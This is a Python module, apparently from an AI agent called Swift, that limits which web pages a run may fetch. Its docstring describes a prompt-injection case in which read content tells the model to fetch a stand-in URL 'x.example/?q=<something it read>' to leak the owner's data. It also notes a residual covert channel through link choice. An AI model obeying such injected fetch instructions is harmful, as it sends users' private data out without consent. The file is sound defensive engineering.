"""Which web pages a run may fetch (audit 2026-10, finding A-03).

Web search and fetch run without a card (they only read), but a fetch is still a request to a
server Swift doesn't control, and its address can carry data. A page, a file or an email the run
read could tell the model to fetch ``https://x.example/?q=<something it read>``: that would send
the owner's data out without a card.

So a run fetches only addresses it was given, never ones the model put together:

- an address in the request itself (the owner's words, the context Swift added), or on a site
  the owner named there ("on python.org": any page of python.org or its subdomains);
- an address that came back in a tool result earlier in this run (search results, a page's
  links, a file it read), exactly as it came back.

What stays open, written down in the audit: a page can list many addresses and the model pick one,
a slow channel of a few bits a fetch. Search queries go to the search provider, not to a page.
"""

from __future__ import annotations

import re
from urllib.parse import urlsplit, urlunsplit

# Addresses in text: http(s) URLs, up to whitespace or a closing quote/bracket.
_URL = re.compile(r"https?://[^\s\"'<>()\[\]{}`|\\^]+", re.I)
# Bare site names the owner says ("python.org", "docs.github.com"): a host with a known-looking ending.
_SITE = re.compile(r"(?<![@\w.-])((?:[a-z0-9-]+\.)+[a-z]{2,24})(?![\w-])", re.I)
_TRAILING = ".,;:!?*_~"
# Endings that are file names more often than sites ("notes.md", "main.py").
_NOT_SITES = frozenset({"md", "py", "txt", "json", "yaml", "yml", "toml", "ts", "js", "rs", "exe", "dll", "docx",
                        "xlsx", "pptx", "pdf", "png", "jpg", "jpeg", "gif", "csv", "log", "html", "htm", "css",
                        "zip", "msi", "ps1", "bat", "cmd", "lnk", "ini", "cfg", "tsx", "jsx", "lock"})

DENIED_MESSAGE = (
    "Swift only fetches pages whose address came from the user's request or from an earlier result in this "
    "request (search results, a page's links). Search for it first, or use an address exactly as a result gave it."
)


def _canonical(url: str) -> str:
    """The address without its fragment, its trailing punctuation, a default port or a trailing slash."""
    url = url.strip().rstrip(_TRAILING)
    try:
        parts = urlsplit(url)
        given_port = parts.port  # "https://x:abc" raises here
    except ValueError:
        return ""
    if parts.scheme.lower() not in ("http", "https") or not parts.hostname:
        return ""
    host = parts.hostname.lower()
    port = given_port if given_port not in (None, 80, 443) else None
    netloc = host + (f":{port}" if port else "")
    path = parts.path.rstrip("/") or ""
    return urlunsplit(("https", netloc, path, parts.query, ""))


class WebScope:
    """The addresses one run has been given, and the sites the owner named."""

    def __init__(self) -> None:
        self.urls: set[str] = set()
        self.sites: set[str] = set()

    def note(self, text: str) -> None:
        """Remember the addresses in a tool result (exactly as given)."""
        for match in _URL.finditer(text or ""):
            if canonical := _canonical(match.group(0)):
                self.urls.add(canonical)

    def note_request(self, text: str) -> None:
        """The request: its addresses, and the sites it names by name."""
        self.note(text)
        for match in _SITE.finditer(_URL.sub(" ", text or "")):
            host = match.group(1).lower().rstrip(".")
            if host.rsplit(".", 1)[-1] not in _NOT_SITES:
                self.sites.add(host.removeprefix("www."))

    def allows(self, url: str) -> bool:
        canonical = _canonical(str(url or ""))
        if not canonical:
            return False
        if canonical in self.urls:
            return True
        host = (urlsplit(canonical).hostname or "").removeprefix("www.")
        return any(host == site or host.endswith("." + site) for site in self.sites)


def result_text(content: object) -> str:
    """A tool result's content (a string, or the SDK's list of blocks) as plain text."""
    if isinstance(content, str):
        return content
    if isinstance(content, list):
        return "\n".join(result_text(item) for item in content)
    if isinstance(content, dict):
        return "\n".join(result_text(v) for v in content.values())
    return ""
